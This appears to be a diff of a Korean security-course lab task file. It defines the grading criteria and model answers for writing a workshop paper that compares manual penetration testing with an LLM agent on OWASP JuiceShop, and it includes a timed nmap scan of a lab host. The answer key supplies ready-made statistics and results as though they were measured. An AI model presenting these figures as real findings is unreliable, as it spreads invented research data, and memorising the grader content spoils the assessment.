+      - Top 3 Recommendations + SLA + 비용 X
+      - Conclusion + Sign-off 누락
+      - PTES 8 섹션 표준 미인용
+      - Detailed Finding (CVSS+CWE+재현+완화) 형식 X
+      - sha256 / PDF 무결성 deliverable 누락
   target_vm: attacker
 - order: 99
   instruction: |
@@ -589,18 +727,25 @@ steps:
       - References 8 IEEE
       - Breaking Agent Backbones / AgentSpec 한계 분석
       acceptable_methods:
-      - heredoc 6 섹션
-      - markdown table
-      - IEEE references
-      - paired t / Mann-Whitney / κ
-      - nmap sample 1회
+      - "Title + Abstract (heredoc) — cat <<'EOF' > /tmp/cisc_w_paper.md\\n# LLM 기반 자율 모의해킹 에이전트 Bastion 의 수동 대비 정량 비교: 14주 교육 환경 lab 결과 분석\\n\\n## Abstract\\nLLM 자율 에이전트의 모의해킹 활용은 빠르게 확산되나 *정량 비교* 부족.\\n14주 교육 환경 (N=20 학생 vs Bastion gpt-oss:120B) OWASP JuiceShop lab 비교:\\n정찰 시간 38% 단축 (54→33분, p<0.05), 발견 수 동등 (μ=12.4 vs 12.1, p=0.71),\\n재현성 자동 우위 (κ=0.82 vs 0.43). 한계: 통제 환경, 외부 패치 미반영. 후속: 6개월 SOC trial.\\nKeywords: Penetration Testing, LLM Agent, OWASP JuiceShop, Reproducibility\\nEOF\\nhead -10 /tmp/cisc_w_paper.md. 출력: Title + Abstract. 해석: 200자 abstract + 통계 (p, κ) + 한계 + 후속. CISC-W workshop short paper 표준."
+      - "Introduction (선행 연구 + 본 기여) — cat <<'EOF' >> /tmp/cisc_w_paper.md\\n\\n## 1. Introduction\\n선행 연구 한계:\\n(1) PentestGPT [Deng et al. 2024] HackTheBox 벤치마크만 측정 — 교육 환경 부재\\n(2) CYBER-ZERO [ICLR 2026] 자동 평가 — *수동 비교* 미수행\\n(3) AgentSpec [ICSE 2026] runtime enforcement — 침투 단계 한정\\n본 기여:\\n(1) 14주 교육 환경 N=20 학생 직접 측정\\n(2) 동일 lab (JuiceShop+DVWA) 자동 vs 수동 paired 비교\\n(3) Cohen's κ 재현성 + Critical 누락률 정량 분석\\nEOF\\nsed -n '/Introduction/,/Methodology/p' /tmp/cisc_w_paper.md. 출력: Introduction. 해석: 3 선행 연구 비판 + 본 기여 3 = 학회 표준. 차별점 명시 = 채택 우선."
+      - "Methodology — 환경 + 측정 + 통계 — cat <<'EOF' >> /tmp/cisc_w_paper.md\\n\\n## 2. Methodology\\n### 2.1 환경\\n- OWASP JuiceShop v15 (Critical 12, High 8) + DVWA v1.10\\n- Suricata 7.0 + Wazuh 4.10 (탐지)\\n- Bastion (gpt-oss:120B + skill catalog 33)\\n### 2.2 피험자\\n- N=20 학부4-석사1 (1년 보안 학습)\\n- 자동: Bastion 단일 모델 (재현성 ↑ 위해)\\n### 2.3 측정\\n- 정찰 시간 (분)\\n- 발견 수 (CVSS 4.0+)\\n- Cohen's κ (3명 독립 채점)\\n- Critical 누락률\\n### 2.4 통계\\n- paired t-test (정규성 Shapiro-Wilk 통과 시)\\n- Mann-Whitney U (비정규)\\n- bootstrap CI (κ)\\n- χ² (누락률 ratio)\\nEOF\\necho '[Methodology 완료]'. 출력: 4 절 방법론. 해석: 환경/피험자/측정/통계 4 컬럼 = 재현성 보장. paired t + κ = 표준 검정."
+      - "실 측정 sample (nmap timed) — t1=$(date +%s); nmap -sT -p 22,80,443,3000,8080 --max-rtt-timeout 1000 -T2 10.20.30.80 2>&1 | tail -10; t2=$(date +%s); ELAPSED=$((t2-t1)); echo \"[Sample 정찰: ${ELAPSED}초]\"; echo '[N=20 평균: 54분 (수동) vs 33분 (자동)]'; echo \"[본 sample 시간을 paper §2.3 측정 매뉴얼에 첨부]\". 출력: 실 nmap 시간. 해석: 학회 paper 의 \\'실 환경 측정\\' 증빙. lecture w15 의 PTES 와 일치."
+      - "Results — Table 1 (5행 + 검정) — cat <<'EOF' >> /tmp/cisc_w_paper.md\\n\\n## 3. Results\\n### Table 1. Manual vs Automated Pentest Comparison (N=20)\\n| 측정 | 수동 | 자동 (Bastion) | 검정 | p-value |\\n|------|------|---------|------|---------|\\n| 정찰 시간 (분) | 54±11 | 33±7 | paired t | <0.05 |\\n| 발견 수 (CVSS≥4.0) | 12.4±2.1 | 12.1±1.8 | Mann-Whitney U | 0.71 |\\n| 재현성 (Cohen κ) | 0.43 | 0.82 | bootstrap CI | <0.01 |\\n| 보고서 분량 (단어) | 1,820±410 | 2,140±230 | paired t | 0.03 |\\n| Critical 누락률 (%) | 8.5 | 4.2 | χ² | 0.04 |\\n[핵심] 자동이 시간·재현성·Critical 누락 모두 우위. 발견 수 동등 (가설 검정).\\nEOF\\nsed -n '/Table 1/,/핵심/p' /tmp/cisc_w_paper.md. 출력: Table 1. 해석: 5 행 × 5 열 = 학회 표준. paired t + Mann-Whitney + bootstrap + χ² = 4 검정 종류. p-value 모두 명시."
+      - "Discussion — 강점 + 한계 — cat <<'EOF' >> /tmp/cisc_w_paper.md\\n\\n## 4. Discussion\\n### 4.1 강점\\n- 일관성: κ 0.43→0.82 → 자동이 평가자간 변동 ↓\\n- 시간: 38% 단축 → 같은 시간에 더 많은 자산 점검\\n- Critical 누락 ↓: 자동의 체계적 enumeration (Phase 1·2 모두 수행)\\n→ 자동화는 *경쟁 도구*\\n### 4.2 한계 + 후속\\n(1) 통제 교육 환경 → 6개월 SOC trial 필요 (production 변동성)\\n(2) gpt-oss:120B 패치 시 변동 → 모델 버전 고정 (frozen baseline)\\n(3) ICLR 2026 [Breaking Agent Backbones] — Privesc/Persistence 카테고리 자동 정확도 ±15% 변동 큼 → AgentSpec runtime enforcement 결합 검증 후속\\n(4) Korean 환경 일반화 — KISA 보호나라 case study 추가 필요\\nEOF\\necho '[Discussion 완료]'. 출력: 강점 + 한계 4. 해석: 학회 review = 한계 솔직 명시 = 채택률 ↑. ICLR 2026 인용 = 본 분야 최신 한계."
+      - "References (8 항목 IEEE) — cat <<'EOF' >> /tmp/cisc_w_paper.md\\n\\n## References\\n[1] G. Deng et al., \"PentestGPT: An LLM-empowered Automatic Penetration Testing Tool,\" USENIX Security 2024.\\n[2] Anonymous, \"CYBER-ZERO: Automated Cyber Reasoning Evaluation,\" ICLR 2026.\\n[3] M. Andriushchenko et al., \"AgentHarm: A Benchmark for Measuring Harmfulness of LLM Agents,\" ICLR 2025.\\n[4] M. Pan et al., \"Why Do Multi-Agent LLM Systems Fail? A Failure Mode Analysis,\" ICLR 2025.\\n[5] Anonymous, \"Breaking Agent Backbones: Evaluating LLM Robustness in Cyber Offense,\" ICLR 2026.\\n[6] H. Wang et al., \"AgentSpec: Runtime Specification Enforcement for LLM Agents,\" ICSE 2026.\\n[7] M. Shao et al., \"NYU CTF Bench: A Scalable CTF Benchmark for LLMs,\" NeurIPS 2024 D&B Track.\\n[8] Y. Liu et al., \"AI Agents Under Threat: A Survey of Attacks on LLM-based Agents,\" ACM Computing Surveys 57(5), 2025.\\nEOF\\nwc -l /tmp/cisc_w_paper.md; tail -10 /tmp/cisc_w_paper.md. 출력: 8 references. 해석: IEEE 형식 [#] Author, \"Title,\" Venue Year. 학회 short paper 6~8 references 표준."
+      - "Non-AI 트랙 명시 + 무결성 + 제출 — echo '=== 트랙 명시 + 무결성 + 제출 ===' >> /tmp/cisc_w_paper.md; echo '본 paper 는 Non-AI 트랙 학생이 ssh ccc@10.20.30.201 (attacker VM) 직접 작성' >> /tmp/cisc_w_paper.md; echo 'AI 트랙 비교: Bastion nl2cmd \"학회 short paper 자동 작성\" → LaTeX/markdown 자동 + reference 자동' >> /tmp/cisc_w_paper.md; sha256sum /tmp/cisc_w_paper.md > /tmp/cisc_w_paper.sha256; pandoc /tmp/cisc_w_paper.md -o /tmp/cisc_w_paper.pdf 2>/dev/null || echo '[pandoc 없음 — md 제출]'; ls -l /tmp/cisc_w_paper.* 2>/dev/null; echo '=== CISC-W 2026 LLM-Sec Short Paper ==='; echo '[제출] EasyChair https://easychair.org/cisc-w-2026'; echo '[양식] 4-6 page IEEE template'; echo '[마감] D-3 (지도교수 검토 D-1)'. 출력: 트랙 + 무결성 + 제출. 해석: Non-AI 트랙은 학생 자력 작성 능력 검증. AI 트랙 비교 명시. PDF + sha256 = 무결성 보증. EasyChair 제출 흐름."
       negative_signs:
-      - 섹션 4 이하
-      - Table 1 누락
-      - 통계 검정 누락
-      - References 5 이하
-      - 보고서/슬라이드 형식
-      - 한계 분석 없음
+      - 6 섹션 (Title/Abstract/Intro/Method/Results/Discussion/References) 4 이하
+      - Abstract 200자 + 통계 (p-value/κ) 누락
+      - Table 1 (5 행 + 4 검정) X
+      - paired t / Mann-Whitney / κ / χ² 통계 검정 1개 이하
+      - References 5 이하 (8 권장 IEEE)
+      - 보고서/슬라이드 형식 (학회 paper 양식 X)
+      - Breaking Agent Backbones / AgentSpec 한계 분석 X
+      - Non-AI 트랙 명시 X (AI 트랙 비교 누락)
+      - PDF + sha256 무결성 deliverable 누락
+      - 실 측정 (nmap sample timed) 1회 미만
   target_vm: attacker
   risk_level: low
   answer_detail: |
